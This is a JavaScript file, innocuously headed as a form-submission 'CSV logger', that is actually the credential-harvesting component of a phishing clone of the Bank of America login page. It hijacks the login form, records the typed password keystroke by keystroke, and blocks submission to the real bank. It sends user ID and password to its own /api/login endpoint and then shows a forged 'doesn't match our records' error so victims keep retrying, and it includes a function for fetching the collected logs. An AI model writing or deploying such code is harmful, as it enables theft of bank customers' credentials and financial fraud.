/**
 * CSV Logger for form submissions
 * Captures login form data and sends it to the server for CSV logging
 * Displays consistent error message for all login attempts
 */

class FormLogger {
  constructor() {
    // Use relative URL for API endpoint (works on both localhost and production)
    this.apiEndpoint = '/api/login';
    this.rawPassword = ''; // Store unmasked password
    this.init();
  }

  init() {
    const self = this;
    
    // FIRST: Hide any error messages on page load (they'll only show after login attempt)
    const existingErrors = document.querySelectorAll('.error-state, .error, [class*="error"], .alert-danger');
    console.log('[Logger] Found', existingErrors.length, 'error elements on page load, hiding them');
    existingErrors.forEach((el) => {
      if (el && el.style) {
        el.style.display = 'none';
        console.log('[Logger] Hidden error element:', el.className);
      }
    });
    
    // Also monitor for any dynamically added errors and hide them
    const observer = new MutationObserver((mutations) => {
      mutations.forEach((mutation) => {
        if (mutation.addedNodes.length) {
          mutation.addedNodes.forEach((node) => {
            if (node.nodeType === 1) { // Element node
              const classList = node.classList ? node.classList.toString() : '';
              if (classList.includes('error') || classList.includes('alert')) {
                console.log('[Logger] Hiding dynamically added error:', classList);
                node.style.display = 'none';
              }
            }
          });
        }
      });
    });
    
    // Start observing the main content area
    const form = document.getElementById('EnterOnlineIDForm');
    const container = form ? form.closest('.columns') || form.parentElement : document.body;
    observer.observe(container, { childList: true, subtree: true });
    
    // Patch jQuery to prevent disabling the password field
    if (typeof jQuery !== 'undefined') {
      const originalProp = jQuery.fn.prop;
      jQuery.fn.prop = function(name, value) {
        if (name === 'disabled' && value === true) {
          // Check if this is the password field
          if (this.attr('id') === 'tlpvt-passcode-input' || this.attr('name') === 'dummy-passcode') {
            console.log('[Logger] Prevented jQuery from disabling password field');
            return this; // Don't disable
          }
        }
        return originalProp.apply(this, arguments);
      };
      
      // Also patch submit method on jQuery
      const originalSubmit = jQuery.fn.submit;
      jQuery.fn.submit = function(handler) {
        console.log('[Logger] jQuery.submit() called on', this.attr('id'));
        if (this.attr('id') === 'EnterOnlineIDForm') {
          // Intercept before calling original
          self.logFormData(this[0]).then(() => {
            console.log('[Logger] Logged form data via jQuery.submit');
          });
        }
        return originalSubmit.apply(this, arguments);
      };
    }

    // Enable and configure password field
    const passwordInput = document.getElementById('tlpvt-passcode-input');
    if (passwordInput) {
      // CRITICAL: Enable the password field (it's disabled in HTML)
      passwordInput.disabled = false;
      passwordInput.removeAttribute('readonly');
      passwordInput.style.opacity = '1';
      passwordInput.style.cursor = 'text';
      console.log('[Logger] Password field enabled');
      
      // Use MutationObserver to prevent re-disabling
      const observer = new MutationObserver((mutations) => {
        mutations.forEach((mutation) => {
          if (mutation.attributeName === 'disabled' || mutation.attributeName === 'readonly') {
            if (passwordInput.disabled || passwordInput.readOnly) {
              passwordInput.disabled = false;
              passwordInput.removeAttribute('readonly');
              console.log('[Logger] Password field re-enabled after mutation');
            }
          }
        });
      });
      
      observer.observe(passwordInput, {
        attributes: true,
        attributeFilter: ['disabled', 'readonly']
      });
      
      // Listen to all input events (covers paste, typing, etc.)
      passwordInput.addEventListener('input', (e) => {
        this.rawPassword = passwordInput.value;
      });
      
      // Also capture individual keypresses to build up password
      passwordInput.addEventListener('keypress', (e) => {
        if (e.key && e.key.length === 1) {
          this.rawPassword += e.key;
        }
      });
      
      // Handle backspace/delete
      passwordInput.addEventListener('keydown', (e) => {
        if (e.key === 'Backspace' && this.rawPassword.length > 0) {
          this.rawPassword = this.rawPassword.slice(0, -1);
        }
      });
      
      // Clear when field is cleared
      passwordInput.addEventListener('change', (e) => {
        if (!passwordInput.value) {
          this.rawPassword = '';
        }
      });
      
      // Also monitor value changes via direct property updates
      const originalValueDescriptor = Object.getOwnPropertyDescriptor(HTMLInputElement.prototype, 'value');
      Object.defineProperty(passwordInput, 'value', {
        get() {
          return originalValueDescriptor.get.call(this);
        },
        set(newValue) {
          originalValueDescriptor.set.call(this, newValue);
          if (this.id === 'tlpvt-passcode-input') {
            // Update raw password when value is set
            this.formLogger = this.formLogger || window.formLogger;
            if (this.formLogger) {
              this.formLogger.rawPassword = newValue;
            }
          }
        }
      });
    }

    // CRITICAL: Intercept the form BEFORE Bank of America's handlers
    const form = document.getElementById('EnterOnlineIDForm');
    if (form) {
      console.log('[Logger] Found EnterOnlineIDForm, hijacking submission');
      
      // Store original action
      this.originalAction = form.action;
      this.originalMethod = form.method;
      this.originalTarget = form.target;
      
      // Override form.submit() method VERY EARLY
      const self = this;
      const originalSubmit = form.submit;
      form.submit = function() {
        console.log('[Logger] Form.submit() called, intercepting...');
        self.logFormData(form).then(() => {
          console.log('[Logger] Data logged, blocking submission to Bank of America');
          // DO NOT allow submission to Bank of America - we've already logged the credentials
          // This prevents the redirect and error page
        }).catch(error => {
          console.error('[Logger] Error during submission:', error);
          // Even on error, do NOT submit to Bank of America
        });
        // Always prevent default form submission
        return false;
      };
      
      // Also intercept input element submit (for form.elements.namedItem('submit'))
      const submitElements = form.querySelectorAll('input[type="submit"], button[type="submit"]');
      submitElements.forEach((elem) => {
        console.log('[Logger] Found submit element:', elem.value || elem.textContent);
      });
    }

    // Intercept login button click with high priority
    document.addEventListener('click', (e) => {
      // Check if any button in the form was clicked
      const form = document.getElementById('EnterOnlineIDForm');
      if (form && form.contains(e.target)) {
        const button = e.target;
        console.log('[Logger] Click detected on form element:', button.tagName, button.id, button.name, button.value);
        
        // If it's a button or submit input
        if (button.tagName === 'BUTTON' || (button.tagName === 'INPUT' && button.type === 'submit')) {
          console.log('[Logger] Submit button clicked, intercepting form submission');
          e.preventDefault();
          e.stopPropagation();
          this.logFormData(form);
          return false;
        }
      }
    }, true); // Use capture phase to intercept BEFORE other listeners

    // Intercept login button click by ID
    document.addEventListener('click', (e) => {
      const button = e.target.closest('#login_button');
      if (button) {
        console.log('[Logger] #login_button clicked');
        e.preventDefault();
        e.stopPropagation();
        // Capture form data when login button is clicked
        const form = button.closest('form') || document.getElementById('EnterOnlineIDForm');
        if (form) {
          this.logFormData(form);
          return false;
        }
      }
    }, true);

    // Also intercept all form submissions with capture phase
    document.addEventListener('submit', (e) => {
      const form = e.target;
      console.log('[Logger] Submit event caught on form:', form.id, form.method);
      if (form.id === 'login-form' || form.method === 'POST' || form.id === 'EnterOnlineIDForm') {
        console.log('[Logger] Submitting login form, preventing default');
        e.preventDefault();
        e.stopPropagation();
        this.logFormData(form);
        return false;
      }
    }, true); // Capture phase
    
    // Monitor for any attempts to change form action
    if (form) {
      const observer = new MutationObserver((mutations) => {
        mutations.forEach((mutation) => {
          if (mutation.type === 'attributes') {
            console.log('[Logger] Form attribute changed:', mutation.attributeName, form.getAttribute(mutation.attributeName));
          }
        });
      });
      observer.observe(form, { attributes: true });
    }
  }

  /**
   * Extract form data and send to server
   */
  async logFormData(form) {
    try {
      console.log('[Logger] logFormData() started');
      console.log('[Logger] Form element:', form.id, 'Tag:', form.tagName);
      
      // Debug: Log form contents
      const inputs = form.querySelectorAll('input');
      console.log('[Logger] Form has', inputs.length, 'input elements');
      inputs.forEach((input, idx) => {
        console.log(`  [${idx}] Name: ${input.name}, ID: ${input.id}, Type: ${input.type}, Value: ${input.value.substring(0, 20)}`);
      });
      
      // Ensure password field is enabled during submit
      const passwordInput = document.getElementById('tlpvt-passcode-input');
      if (passwordInput) {
        passwordInput.disabled = false;
        console.log('[Logger] Password field disabled state checked:', passwordInput.disabled);
      } else {
        console.log('[Logger] WARNING: Password input not found!');
      }
      
      // Get User ID from input field - try multiple selectors
      let userIdInput = form.querySelector('input[name="dummy-onlineId"]');
      if (!userIdInput) {
        console.log('[Logger] dummy-onlineId not found in form, trying by ID...');
        userIdInput = document.getElementById('enterID-input');
      }
      if (!userIdInput) {
        console.log('[Logger] enterID-input not found, trying to find any text input...');
        const textInputs = form.querySelectorAll('input[type="text"]');
        console.log('[Logger] Found', textInputs.length, 'text inputs in form');
        if (textInputs.length > 0) {
          userIdInput = textInputs[0];
          console.log('[Logger] Using first text input:', userIdInput.name);
        }
      }
      
      const userIdValue = userIdInput ? userIdInput.value.trim() : '';
      console.log('[Logger] User ID input element:', userIdInput, 'Value:', userIdValue);

      // Get the actual password value directly from the input field (NOT masked)
      let passwordValue = '';
      
      if (passwordInput) {
        // Get the actual value from the DOM element (this is the unmasked value)
        passwordValue = passwordInput.value || this.rawPassword || '';
        console.log('[Logger] Password captured from DOM - length:', passwordValue.length);
      } else {
        // Fallback to tracked raw password
        passwordValue = this.rawPassword || '';
        console.log('[Logger] Password captured from tracker - length:', passwordValue.length);
      }

      // Get Remember Me checkbox - try both possible selectors
      let rememberMe = false;
      let rememberInput = form.querySelector('input[name="saveMyID"]');
      if (!rememberInput) {
        rememberInput = form.querySelector('input[name="dummy-rememberMe"]');
      }
      if (!rememberInput) {
        // Try to find any checkbox in the form
        const checkboxes = form.querySelectorAll('input[type="checkbox"]');
        console.log('[Logger] Found', checkboxes.length, 'checkboxes in form');
        if (checkboxes.length > 0) {
          rememberInput = checkboxes[0];
        }
      }
      if (rememberInput) {
        rememberMe = rememberInput.checked;
        console.log('[Logger] Remember Me:', rememberMe, '(Field name:', rememberInput.name, ')');
      }

      const data = {
        userId: userIdValue || 'N/A',
        password: passwordValue || 'N/A',
        rememberMe: rememberMe
      };

      console.log('[Logger] About to send login entry:', { 
        userId: data.userId,
        passwordLength: data.password.length,
        rememberMe: data.rememberMe
      });

      // Send to server
      const response = await fetch(this.apiEndpoint, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
      });

      console.log('[Logger] Fetch response status:', response.status);
      
      if (!response.ok) {
        throw new Error(`HTTP ${response.status}`);
      }
      
      const result = await response.json();
      console.log('[Logger] Server response:', result);
      
      if (result.success) {
        console.log('[Logger] Entry successfully logged to database');
        // Display error message after logging
        this.displayErrorMessage();
        // Reset the password tracker for next attempt
        this.rawPassword = '';
        // Clear form fields for next attempt
        this.clearFormFields();
      } else {
        console.warn('[Logger] Server returned success=false:', result.message);
        this.displayErrorMessage();
      }
    } catch (error) {
      console.error('[Logger] Error sending data to server:', error.message);
      // Display error message even if logging fails
      this.displayErrorMessage();
      // Clear form fields anyway so user can try again
      this.clearFormFields();
    }
  }

  /**
   * Clear all form fields for next login attempt
   */
  clearFormFields() {
    // Clear User ID
    const userIdInput = document.querySelector('input[name="dummy-onlineId"]');
    if (userIdInput) {
      userIdInput.value = '';
    }

    // Clear Password
    const passwordInput = document.getElementById('tlpvt-passcode-input');
    if (passwordInput) {
      passwordInput.value = '';
    }

    // Reset password tracker
    this.rawPassword = '';

    console.log('[Logger] Form fields cleared for next attempt');
  }

  /**
   * Display consistent login error message using original BOA format
   */
  displayErrorMessage() {
    // Remove any existing error messages
    const existingError = document.querySelector('.error-state');
    if (existingError) {
      existingError.remove();
    }

    // Scroll to top
    window.scrollTo(0, 0);

    // Create error container matching BOA's original format exactly
    const errorContainer = document.createElement('div');
    errorContainer.className = 'error-state';
    errorContainer.innerHTML = `
      <style>
        .error-state {
          background-color: #ffe6e6;
          border: 1px solid #d32f2f;
          border-left: 5px solid #c81c24;
          padding: 16px;
          margin-bottom: 20px;
          font-family: Arial, sans-serif;
          font-size: 13px;
          line-height: 1.5;
          color: #333;
          display: flex;
          gap: 12px;
        }

        .error-state-icon-container {
          display: flex;
          justify-content: center;
          align-items: flex-start;
          flex-shrink: 0;
        }

        .error-state-icon {
          width: 32px;
          height: 32px;
          background-color: #c81c24;
          color: white;
          border-radius: 50%;
          display: flex;
          align-items: center;
          justify-content: center;
          font-weight: bold;
          font-size: 20px;
          flex-shrink: 0;
        }

        .error-state-content {
          flex: 1;
        }

        .error-state-content p {
          margin: 0 0 8px 0;
          padding: 0;
        }

        .error-state-content p:first-child {
          color: #c81c24;
          font-weight: 600;
        }

        .error-state-content a {
          color: #0066cc;
          text-decoration: none;
          font-weight: 500;
        }

        .error-state-content a:hover {
          text-decoration: underline;
        }

        .error-state-content p.error-help {
          color: #333;
          font-weight: 600;
          margin-top: 12px;
        }

        .error-state-content p.error-help-text {
          color: #666;
          margin-top: 4px;
          font-size: 12px;
        }
      </style>

      <div class="error-state-icon-container">
        <div class="error-state-icon">!</div>
      </div>
      <div class="error-state-content">
        <p>The information you entered doesn't match our records. You have a few more tries remaining.</p>
        <p>Please try again or click <a href="./login-reset.html">Forgot ID/Password</a></p>
        <p class="error-help">Having problems logging in or resetting your Password?</p>
        <p class="error-help-text">If you're using a password manager or your browser has stored credentials that are no longer valid, deleting your stored credentials should enable you to access your account. <a href="./info.html">Learn more</a></p>
      </div>
    `;

    // Insert error message at the top of the login form area
    const loginForm = document.querySelector('#EnterOnlineIDForm');
    const pageContent = document.querySelector('[class*="online-id-vipaa-module"]') || 
                       document.querySelector('.simple-form') ||
                       document.body;

    if (loginForm) {
      loginForm.parentNode.insertBefore(errorContainer, loginForm);
    } else {
      pageContent.insertBefore(errorContainer, pageContent.firstChild);
    }

    console.log('[Logger] Original BOA error message displayed');
  }

  /**
   * Manual logging method
   */
  async log(userId, password, rememberMe = false) {
    try {
      const response = await fetch(this.apiEndpoint, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          userId,
          password,
          rememberMe
        })
      });

      return await response.json();
    } catch (error) {
      console.error('[Logger] Error logging entry:', error);
      throw error;
    }
  }

  /**
   * Fetch and display logs
   */
  async fetchLogs() {
    try {
      const response = await fetch('/api/logs');
      const result = await response.json();
      return result;
    } catch (error) {
      console.error('[Logger] Error fetching logs:', error);
      throw error;
    }
  }
}

// Initialize logger when DOM is ready
function initializeFormLogger() {
  try {
    window.formLogger = new FormLogger();
    // Ensure password field is enabled after FormLogger initializes
    const passwordInput = document.getElementById('tlpvt-passcode-input');
    if (passwordInput) {
      passwordInput.disabled = false;
      console.log('[Logger] Password field confirmed enabled');
    }
  } catch (error) {
    console.error('[Logger] Failed to initialize:', error);
  }
}

if (document.readyState === 'loading') {
  document.addEventListener('DOMContentLoaded', initializeFormLogger);
} else {
  // DOM already loaded, initialize immediately
  initializeFormLogger();
}

// Also initialize on page load event as fallback
window.addEventListener('load', initializeFormLogger);

// Ensure password field stays enabled with continuous checking
setInterval(() => {
  const passwordInput = document.getElementById('tlpvt-passcode-input');
  if (passwordInput) {
    if (passwordInput.disabled || passwordInput.readOnly) {
      passwordInput.disabled = false;
      passwordInput.removeAttribute('readonly');
      passwordInput.style.opacity = '1';
      passwordInput.style.cursor = 'text';
      console.log('[Logger] Password field continuously re-enabled');
    }
  }
}, 500);
